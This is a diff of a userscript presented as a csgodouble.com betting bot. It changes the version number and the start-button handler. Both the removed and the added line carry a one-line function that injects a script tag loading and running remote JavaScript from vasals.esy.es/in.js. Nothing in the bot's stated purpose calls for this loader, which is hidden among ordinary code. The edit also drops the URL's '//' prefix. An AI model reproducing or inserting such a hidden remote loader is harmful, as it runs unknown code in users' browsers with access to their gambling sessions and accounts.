@@ -2,7 +2,7 @@
 // @name            csgodouble.com - betting bot
 // @description     An userscript that automates csgodouble.com betting using much systems.
 // @namespace       auto bot@kjuubiiz
-// @version         1.46
+// @version         1.47
 // @author          Kjuubiiz
 // @updateURL    https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
 // @downloadURL https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
@@ -21,7 +21,7 @@
  
 'use strict';
  
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
  
 var debug = false;
 var simulation = false;
@@ -230,11 +230,11 @@ function Automated() {
     }
  
     this.menu.start.onclick = function() {
-        //start(self.balance);
-        //self.log('');
+        start(self.balance);
+        self.log('');
  
  
-        self.start();
+        //self.start();
     };
  
     this.menu.stop.onclick = function() {
